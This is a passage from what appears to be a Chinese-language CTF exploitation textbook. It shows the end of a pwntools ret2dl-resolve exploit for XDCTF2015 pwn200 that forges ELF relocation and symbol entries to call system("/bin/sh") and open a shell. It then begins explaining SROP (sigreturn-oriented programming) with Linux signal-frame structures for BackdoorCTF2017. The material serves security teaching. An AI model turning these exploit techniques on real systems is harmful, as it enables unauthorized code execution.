# payload_4 += "AAAA"
# payload_4 += p32(1)
# payload_4 += p32(base_addr + 80)
# payload_4 += p32(len("/bin/sh"))
# payload_4 += fake_reloc
# payload_4 += "A" * (80 - len(payload_4))
# payload_4 += "/bin/sh\x00"
# payload_4 += "A" * (100 - len(payload_4))
# io.sendline(payload_4)
# print io.recv()
# reloc_index = base_addr + 28 - rel_plt
# fake_sym_addr = base_addr + 36
# align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) # since the si
939
6.1.3 pwn XDCTF2015 pwn200
ze of Elf32_Sym is 0x10
# fake_sym_addr = fake_sym_addr + align
# r_sym = (fake_sym_addr - dynsym) / 0x10 # calcute the symbol
index since the size of Elf32_Sym
# r_type = 0x7 # R_386_JMP_SLOT -> Create PLT entry
# r_info = (r_sym  Global symbol
# st_type = 0x2 # STT_FUNC -> Symbol is a code object
# st_info = (st_bind << 4) + (st_type & 0xf) # 0x12
940
6.1.3 pwn XDCTF2015 pwn200
# fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)
# payload_6 = "AAAA"
# payload_6 += p32(plt_0)
# payload_6 += p32(reloc_index)
# payload_6 += "AAAA"
# payload_6 += p32(1)
# payload_6 += p32(base_addr + 80)
# payload_6 += p32(len("/bin/sh"))
# payload_6 += fake_reloc
# payload_6 += "A" * align
# payload_6 += fake_sym
# payload_6 += "write\x00"
# payload_6 += "A" * (80 - len(payload_6))
# payload_6 += "/bin/sh\x00"
# payload_6 += "A" * (100 - len(payload_6))
# io.sendline(payload_6)
# print io.recv()
# reloc_index = base_addr + 28 - rel_plt
# fake_sym_addr = base_addr + 36
# align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
# fake_sym_addr = fake_sym_addr + align
# r_sym = (fake_sym_addr - dynsym) / 0x10
# r_info = (r_sym << 8) + 0x7
# fake_reloc = p32(write_got) + p32(r_info)
# st_name = fake_sym_addr + 0x10 - dynstr
# fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
# payload_7 = "AAAA"
# payload_7 += p32(plt_0)
# payload_7 += p32(reloc_index)
# payload_7 += "AAAA"
# payload_7 += p32(base_addr + 80)
# payload_7 += "AAAA"
# payload_7 += "AAAA"
# payload_7 += fake_reloc
# payload_7 += "A" * align
# payload_7 += fake_sym
# payload_7 += "system\x00"
# payload_7 += "A" * (80 - len(payload_7))
# payload_7 += "/bin/sh\x00"
941
6.1.3 pwn XDCTF2015 pwn200
# payload_7 += "A" * (100 - len(payload_7))
# io.sendline(payload_7)
reloc_index = base_addr + 28 - rel_plt
fake_sym_addr = base_addr + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
r_sym = (fake_sym_addr - dynsym) / 0x10
r_type = 0x7
r_info = (r_sym << 8) + (r_type & 0xff)
fake_reloc = p32(write_got) + p32(r_info)
st_name = fake_sym_addr + 0x10 - dynstr
st_bind = 0x1
st_type = 0x2
st_info = (st_bind << 4) + (st_type & 0xf)
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)
payload_7 = "AAAA"
payload_7 += p32(plt_0)
payload_7 += p32(reloc_index)
payload_7 += "AAAA"
payload_7 += p32(base_addr + 80)
payload_7 += "AAAA"
payload_7 += "AAAA"
payload_7 += fake_reloc
payload_7 += "A" * align
payload_7 += fake_sym
payload_7 += "system\x00"
payload_7 += "A" * (80 - len(payload_7))
payload_7 += "/bin/sh\x00"
payload_7 += "A" * (100 - len(payload_7))
io.sendline(payload_7)
io.interactive()
参考资料
How the ELF Ruined Christmas
Return-to-dl-resolve
942
6.1.3 pwn XDCTF2015 pwn200
943
6.1.4 pwn BackdoorCTF2017 Fun-Signals
6.1.4 pwn BackdoorCTF2017 Fun-Signals
SROP 原理
Linux 系统调用
signal 机制
SROP
pwnlib.rop.srop
BackdoorCTF2017 Fun Signals
参考资料
下载文件
SROP 原理
Linux 系统调用
在开始这一切之前，我想先讲一下 Linux 的系统调用。64 位和 32 位的系统调用表
分别在 /usr/include/asm/unistd_64.h 和
/usr/include/asm/unistd_32.h 中，另外还需要查看
/usr/include/bits/syscall.h 。
一开始 Linux 是通过 int 0x80 中断的方式进入系统调用，它会先进行调用者特
权级别的检查，然后进行压栈、跳转等操作，这无疑会浪费许多资源。从 Linux 2.6
开始，就出现了新的系统调用指令 sysenter / sysexit ，前者用于从 Ring3 进
入 Ring0，后者用于从 Ring0 返回 Ring3，它没有特权级别检查，也没有压栈的操
作，所以执行速度更快。
signal 机制
944
6.1.4 pwn BackdoorCTF2017 Fun-Signals
如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被
挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注
册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后
（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。
一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些
signal 信息。
一个新的返回地址被添加到栈顶，这个返回地址指向 sigreturn 系统调
用。
signal handler 被调用，signal handler 的行为取决于收到什么 signal。
signal handler 执行完之后，如果程序没有终止，则返回地址用于执行
sigreturn 系统调用。
sigreturn 利用 signal frame 恢复所有寄存器以回到之前的状态。
最后，程序执行继续。
不同的架构会有不同的 signal frame，下面是 32 位结构， sigcontext 结构体会
被 push 到栈中：
945
6.1.4 pwn BackdoorCTF2017 Fun-Signals
struct sigcontext
{
unsigned short gs, __gsh;
unsigned short fs, __fsh;
unsigned short es, __esh;
unsigned short ds, __dsh;
unsigned long edi;
unsigned long esi;
unsigned long ebp;
unsigned long esp;
unsigned long ebx;
unsigned long edx;
unsigned long ecx;
unsigned long eax;
unsigned long trapno;
unsigned long err;
unsigned long eip;
unsigned short cs, __csh;
unsigned long eflags;
unsigned long esp_at_signal;
unsigned short ss, __ssh;
struct _fpstate * fpstate;
unsigned long oldmask;
unsigned long cr2;
};
下面是 64 位，push 到栈中的其实是 ucontext_t 结构体：
// defined in /usr/include/sys/ucontext.h
/* Userlevel context. */
typedef struct ucontext_t
{
unsigned long int uc_flags;
struct ucontext_t *uc_link;
stack_t uc_stack; // the stack used by this context
mcontext_t uc_mcontext; // the saved context
sigset_t uc_sigmask;
struct _libc_fpstate __fpregs_mem;
946
6.1.4 pwn BackdoorCTF2017 Fun-Signals
} ucontext_t;
// defined in /usr/include/bits/types/stack_t.h
/* Structure describing a signal stack. */
typedef struct
{
void *ss_sp;
size_t ss_size;
int ss_flags;
} stack_t;
// difined in /usr/include/bits/sigcontext.h
struct sigcontext
{
__uint64_t r8;
__uint64_t r9;
__uint64_t r10;
__uint64_t r11;
__uint64_t r12;
__uint64_t r13;
__uint64_t r14;
__uint64_t r15;
__uint64_t rdi;
__uint64_t rsi;
__uint64_t rbp;
__uint64_t rbx;
__uint64_t rdx;
__uint64_t rax;
__uint64_t rcx;
__uint64_t rsp;
__uint64_t rip;
__uint64_t eflags;
unsigned short cs;
unsigned short gs;
unsigned short fs;
unsigned short __pad0;
__uint64_t err;
__uint64_t trapno;
__uint64_t oldmask;
__uint64_t cr2;
947
6.1.4 pwn BackdoorCTF2017 Fun-Signals
__extension__ union
{
struct _fpstate * fpstate;
__uint64_t __fpstate_word;
};
__uint64_t __reserved1 [8];
};
就像下面这样：
SROP
SROP，即 Sigreturn Oriented Programming，正是利用了 Sigreturn 机制的弱点，
来进行攻击。
948
6.1.4 pwn BackdoorCTF2017 Fun-Signals
首先系统在执行 sigreturn 系统调用的时候，不会对 signal 做检查，它不知道
当前的这个 frame 是不是之前保存的那个 frame。由于 sigreturn 会从用户栈上
恢复恢复所有寄存器的值，而用户栈是保存在用户进程的地址空间中的，是用户进
程可读写的。如果攻击者可以控制了栈，也就控制了所有寄存器的值，而这一切只
需要一个 gadget： syscall; ret; 。
另外，这个 gadget 在一些系统上没有被内存随机化处理，所以可以在相同的位置
上找到，参照下图：
通过设置 eax/rax 寄存器，可以利用 syscall 指令执行任意的系统调用，然
后我们可以将 sigreturn 和 其他的系统调用串起来，形成一个链，从而达到任
意代码执行的目的。下面是一个伪造 frame 的例子：
949
6.1.4 pwn BackdoorCTF2017 Fun-Signals
rax=59 是 execve 的系统调用号，参数 rdi 设置为字符串“/bin/sh”的地
址， rip 指向系统调用 syscall ，最后，将 rt_sigreturn 设置为
sigreturn 系统调用的地址。当 sigreturn 返回后，就会从这个伪造的 frame
中恢复寄存器，从而拿到 shell。
下面是一个更复杂的例子：
950
6.1.4 pwn BackdoorCTF2017 Fun-Signals
首先利用一个栈溢出漏洞，将返回地址覆盖为一个指向 sigreturn gadget
的指针。如果只有 syscall ，则将 RAX 设置为 0xf，也是一样的。在栈上覆
盖上 fake frame。其中：
RSP ：一个可写的内存地址